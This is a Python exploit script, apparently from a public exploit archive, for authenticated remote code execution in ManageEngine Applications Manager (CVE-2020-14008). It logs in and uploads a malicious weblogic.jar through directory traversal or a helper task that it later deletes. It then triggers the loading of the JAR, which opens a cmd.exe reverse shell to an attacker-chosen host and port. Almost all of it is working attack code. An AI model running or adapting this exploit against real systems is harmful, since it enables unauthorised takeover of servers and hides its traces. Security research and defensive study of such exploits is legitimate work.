#!/usr/bin/python3

# Exploit Title: ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)
# Google Dork: None
# Date: 2020-09-04
# Exploit Author: Hodorsec
# Vendor Homepage: https://manageengine.co.uk
# Vendor Vulnerability Description: https://manageengine.co.uk/products/applications_manager/security-updates/security-updates-cve-2020-14008.html
# Software Link: http://archives.manageengine.com/applications_manager/14720/
# Version: Until version 14720
# Tested on: version 12900 and version 14700
# CVE : CVE-2020-14008

# Summary:
# POC for proving ability to execute malicious Java code in uploaded JAR file as an Oracle Weblogic library to connect to Weblogic servers
# Exploits the newInstance() and loadClass() methods being used by the "WeblogicReference", when attempting a Credential Test for a new Monitor
# When invoking the Credential Test, a call is being made to lookup a possibly existing "weblogic.jar" JAR file, using the "weblogic.jndi.Environment" class and method

# Vulnerable code:
# Lines 129 - 207 in com/adventnet/appmanager/server/wlogic/statuspoll/WeblogicReference.java
# 129 /*     */   public static MBeanServer lookupMBeanServer(String hostname, String portString, String username, String password, int version) throws Exception {
# 130 /* 130 */     ClassLoader current = Thread.currentThread().getContextClassLoader();
# 131 /*     */     try {
# 132 /* 132 */       boolean setcredentials = false;
# 133 /* 133 */       String url = "t3://" + hostname + ":" + portString;
# 134 /* 134 */       JarLoader jarLoader = null;
# 135 /*     */
# ....<SNIP>....
# 143 /*     */       }
# 144 /* 144 */       else if (version == 8)
# 145 /*     */       {
# 146 /* 146 */         if (new File("./../working/classes/weblogic/version8/weblogic.jar").exists())
# 147 /*     */         {
# 148 /*     */
# 149 /* 149 */           jarLoader = new JarLoader("." + File.separator + ".." + File.separator + "working" + File.separator + "classes" + File.separator + "weblogic" + File.separator + "version8" + File.separator + "weblogic.jar");
# 150 /*     */
# ....<SNIP>....
# 170 /* 170 */       Thread.currentThread().setContextClassLoader(jarLoader);
# 171 /* 171 */       Class cls = jarLoader.loadClass("weblogic.jndi.Environment");
# 172 /* 172 */       Object env = cls.newInstance();

# Example call for MAM version 12900:
# $ python3 poc_mam_weblogic_upload_and_exec_jar.py https://192.168.252.12:8443 admin admin weblogic.jar
# [*] Visiting page to retrieve initial cookies...
# [*] Retrieving admin cookie...
# [*] Getting base directory of ManageEngine...
# [*] Found base directory: C:\Program Files (x86)\ManageEngine\AppManager12
# [*] Creating JAR file...
# Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
# Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
# added manifest
# adding: weblogic/jndi/Environment.class(in = 1844) (out= 1079)(deflated 41%)
# [*] Uploading JAR file...
# [*] Attempting to upload JAR directly to targeted Weblogic folder...
# [*] Copied successfully via Directory Traversal, jumping directly to call vulnerable function!
# [*] Running the Weblogic credentialtest which triggers the code in the JAR...
# [*] Check your shell...

# Function flow:
# 1. Get initial cookie
# 2. Get valid session cookie by logging in
# 3. Get base directory of installation
# 4. Generate a malicious JAR file
# 5. Attempt to directly upload JAR, if success, jump to 7
# 6. Create task with random ID to copy JAR file to expected Weblogic location
# 7. Execute task
# 8. Delete task for cleanup
# 9. Run the vulnerable credentialTest, using the malicious JAR

import requests
import urllib3
import shutil
import subprocess
import os
import sys
import random
import re
from lxml import html

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    headers = {
        'User-Agent': 'Mozilla',
    }
    return headers

def get_initial_cookie(url,headers):
    print("[*] Visiting page to retrieve initial cookies...")
    target = url + "/index.do"
    r = requests.get(target,headers=headers,timeout=timeout,verify=False)
    return r.cookies

def get_valid_cookie(url,headers,initial_cookies,usern,passw):
    print("[*] Retrieving admin cookie...")
    appl_cookie = "JSESSIONID_APM_9090"
    post_data = {'clienttype':'html',
                'webstart':'',
                'j_username':usern,
                'ScreenWidth':'1280',
                'ScreenHeight':'709',
                'username':usern,
                'j_password':passw,
                'submit':'Login'}
    target = url + "/j_security_check"
    r = requests.post(target,data=post_data,headers=headers,cookies=initial_cookies,timeout=timeout,verify=False)
    res = r.text
    if "Server responded in " in res:
        return r.cookies
    else:
        print("[!] No valid response from used session, exiting!\n")
        exit(-1)

def get_base_dir(url,headers,valid_cookie):
    print("[*] Getting base directory of ManageEngine...")
    target = url + "/common/serverinfo.do"
    params = {'service':'AppManager',
            'reqForAdminLayout':'true'}
    r = requests.get(target,params=params,headers=headers,cookies=valid_cookie,timeout=timeout,verify=False)
    tree = html.fromstring(r.content)
    pathname = tree.xpath('//table[@class="lrbtborder"]/tr[6]/td[2]/@title')
    base_dir = pathname[0]
    print("[*] Found base directory: " + base_dir)
    return base_dir

def create_jar(command,jarname,revhost,revport):
    print("[*] Creating JAR file...")
    # Variables
    classname = "Environment"
    pkgname = "weblogic.jndi"
    fullname = pkgname + "." + classname
    manifest = "MANIFEST.MF"

    # Directory variables
    curdir = os.getcwd()
    metainf_dir = "META-INF"
    maindir = "weblogic"
    subdir = maindir + "/jndi"
    builddir = curdir + "/" + subdir

    # Check if directory exist, else create directory
    try:
        if os.path.isdir(builddir):
            pass
        else:
            os.makedirs(builddir)
    except OSError:
        print("[!] Error creating local directory \"" + builddir + "\", check permissions...")
        exit(-1)

    # Creating the text file using given parameters
    javafile = '''package ''' + pkgname + ''';

    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;
    import java.util.concurrent.TimeUnit;

    public class ''' + classname + ''' {

      // This method is being called by lookupMBeanServer() in com/adventnet/appmanager/server/wlogic/statuspoll/WeblogicReference.java
      // Uses the jarLoader.loadClass() method to load and initiate a new instance via newInstance()
      public void setProviderUrl(String string) throws Exception {
        System.out.println("Hello from setProviderUrl()");
        connect();
      }

      // Normal main() entry
      public static void main(String args[]) throws Exception {
        System.out.println("Hello from main()");
        // Added delay to notice being called from main()
        TimeUnit.SECONDS.sleep(10);
        connect();
      }

      // Where the magic happens
      public static void connect() throws Exception {
        String host = "''' + revhost + '''";
        int port = ''' + str(revport) + ''';
        String[] cmd = {"''' + command + '''"};

        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
          while(pi.available()>0)
            so.write(pi.read());
          while(pe.available()>0)
            so.write(pe.read());
          while(si.available()>0)
            po.write(si.read());
          so.flush();
          po.flush();

          try {
            p.exitValue();
            break;
          }
          catch (Exception e){
          }

        };
        p.destroy();
        s.close();
      }

    }'''

    # Output file to desired directory
    os.chdir(builddir)
    print(javafile,file=open(classname + ".java","w"))

    # Go to previous directory to create JAR file
    os.chdir(curdir)

    # Create the compiled .class file
    cmdCompile = "javac --release 7 " + subdir + "/*.java"
    process = subprocess.call(cmdCompile,shell=True)

    # Creating Manifest file
    try:
        if os.path.isdir(metainf_dir):
            pass
        else:
            os.makedirs(metainf_dir)
    except OSError:
        print("[!] Error creating local directory \"" + metainf_dir + "\", check permissions...")
        exit(-1)
    print("Main-Class: " + fullname,file=open(metainf_dir + "/" + manifest,"w"))

    # Create JAR file
    cmdJar = "jar cmvf " + metainf_dir + "/" + manifest + " " + jarname + " " + subdir + "/*.class"
    process = subprocess.call(cmdJar,shell=True)

    # Cleanup directories
    try:
        shutil.rmtree(metainf_dir)
        shutil.rmtree(maindir)
    except:
        print("[!] Error while cleaning up directories.")
    return True

def upload_jar(url,headers,valid_cookie,jarname,rel_path):
    print("[*] Uploading JAR file...")
    target = url + "/Upload.do"
    path_normal = './'
    path_trav = rel_path
    jar = {'theFile':(jarname,open(jarname, 'rb'))}
    print("[*] Attempting to upload JAR directly to targeted Weblogic folder...")
    post_data = {'uploadDir':path_trav}
    r_upload = requests.post(target, data=post_data, headers=headers, files=jar, cookies=valid_cookie, timeout=timeout,verify=False)
    res = r_upload.text
    if "successfully uploaded" not in res:
        print("[!] Failed to upload JAR directly, continue to add and execute job to move JAR...")
        post_data = {'uploadDir':path_normal}
        jar = {'theFile':(jarname,open(jarname, 'rb'))}
        r_upload = requests.post(target, data=post_data, headers=headers, files=jar, cookies=valid_cookie, timeout=timeout,verify=False)
        return "normal_path"
    else:
        print("[*] Copied successfully via Directory Traversal, jumping directly to call vulnerable function!")
        return "trav_path"

def create_task(url,headers,valid_cookie,action_name,rel_path,work_dir):
    print("[*] Creating a task to move the JAR file to relative path: " + rel_path + "...")
    valid_resp = "Execute Program succesfully created."
    target = url + "/adminAction.do"
    post_data = {'actions':'/adminAction.do?method=showExecProgAction&haid=null',
                'method':'createExecProgAction',
                'id':'0',
                'displayname':action_name,
                'serversite':'local',
                'choosehost':'-2',
                'prompt':'$',
                'command':'move weblogic.jar ' + rel_path,
                'execProgExecDir':work_dir,
                'abortafter':'10',
                'cancel':'false'}
    r = requests.post(target,data=post_data,headers=headers,cookies=valid_cookie,timeout=timeout,verify=False)
    res = r.text
    found_id = ""
    if action_name in res:
        tree = html.fromstring(r.content)
        actionurls = tree.xpath('//table[@id="executeProgramActionTable"]/tr[@class="actionsheader"]/td[2]/a/@onclick')
        actionnames = tree.xpath('//table[@id="executeProgramActionTable"]/tr[@class="actionsheader"]/td[2]/a/text()')

        i = 0
        for name in actionnames:
            for url in actionurls:
                if action_name in name:
                    found_id = re.search(".*actionid=(.+?)','", actionurls[i]).group(1)
                    print("[*] Found actionname: " + action_name + " with found actionid " + found_id)
                    break
            i+=1
        return found_id
    else:
        print("[!] Actionname not found. Task probably wasn't created, please check. Exiting.")
        exit(-1)

def exec_task(url,headers,valid_cookie,found_id):
    print("[*] Executing created task with id: " + found_id + " to copy JAR...")
    valid_resp = "has been successfully executed"
    target = url + "/common/executeScript.do"
    params = {'method':'testAction',
            'actionID':found_id,
            'haid':'null'}
    r = requests.get(target,params=params,headers=headers,cookies=valid_cookie,timeout=timeout,verify=False)
    res = r.text
    if valid_resp in res:
        print("[*] Task " + found_id + " has been executed successfully")
    else:
        print("[!] Task not executed. Check requests, exiting...")
        exit(-1)
    return

def del_task(url,headers,valid_cookie,found_id):
    print("[*] Deleting created task as JAR has been copied...")
    target = url + "/adminAction.do"
    params = {'method':'deleteProgExecAction'}
    post_data = {'haid':'null',
                'headercheckbox':'on',
                'progcheckbox':found_id}
    r = requests.post(target,params=params,data=post_data,headers=headers,cookies=valid_cookie,timeout=timeout,verify=False)

def run_credtest(url,headers,valid_cookie):
    print("[*] Running the Weblogic credentialtest which triggers the code in the JAR...")
    target = url + "/testCredential.do"
    post_data = {'method':'testCredentialForConfMonitors',
                'serializedData':'url=/jsp/newConfType.jsp',
                'searchOptionValue':'',
                'query':'',
                'addtoha':'null',
                'resourceid':'',
                'montype':'WEBLOGIC:7001',
                'isAgentEnabled':'NO',
                'resourcename':'null',
                'isAgentAssociated':'false',
                'hideFieldsForIT360':'null',
                'childNodesForWDM':'[]',
                'csrfParam':'',
                'type':'WEBLOGIC:7001',
                'displayname':'test',
                'host':'localhost',
                'netmask':'255.255.255.0',
                'resolveDNS':'False',
                'port':'7001',
                'CredentialDetails':'nocm',
                'cmValue':'-1',
                'version':'WLS_8_1',
                'sslenabled':'False',
                'username':'test',
                'password':'test',
                'pollinterval':'5',
                'groupname':''}

    print("[*] Check your shell...")
    requests.post(target,data=post_data,headers=headers,cookies=valid_cookie,verify=False)
    return

# Main
def main(argv):
    if len(sys.argv) == 6:
        url = sys.argv[1]
        usern = sys.argv[2]
        passw = sys.argv[3]
        revhost = sys.argv[4]
        revport = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <url> <username> <password> <reverse_shell_host> <reverse_shell_port>")
        print("[*] Example: " + sys.argv[0] + " https://192.168.252.12:8443 admin admin 192.168.252.14 6666\n")
        exit(0)

    # Do stuff
    try:
        # Set HTTP headers
        headers = http_headers()

        # Relative path to copy the malicious JAR file
        rel_path = "classes/weblogic/version8/"
        # Generate a random ID to use for the task name and task tracking
        random_id = str(random.randrange(0000,9999))
        # Action_name used for displaying actions in overview
        action_name = "move_weblogic_jar" + random_id
        # Working dir to append to base dir
        base_append = "\\working\\"
        # Name for JAR file to use
        jarname = "weblogic.jar"
        # Command shell to use
        cmd = "cmd.exe"

        # Execute functions
        initial_cookies = get_initial_cookie(url,headers)
        valid_cookie = get_valid_cookie(url,headers,initial_cookies,usern,passw)
        work_dir = get_base_dir(url,headers,valid_cookie) + base_append
        create_jar(cmd,jarname,revhost,revport)
        status_jar = upload_jar(url,headers,valid_cookie,jarname,rel_path)

        # Check if JAR can be uploaded via Directory Traversal
        # If so, no need to add and exec actions; just run the credentialtest directly
        if status_jar == "trav_path":
            run_credtest(url,headers,valid_cookie)
        # Cannot be uploaded via Directory Traversal, add and exec actions to move JAR. Lastly, run the vulnerable credentialtest
        elif status_jar == "normal_path":
            found_id = create_task(url,headers,valid_cookie,action_name,rel_path,work_dir)
            exec_task(url,headers,valid_cookie,found_id)
            del_task(url,headers,valid_cookie,found_id)
            run_credtest(url,headers,valid_cookie)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])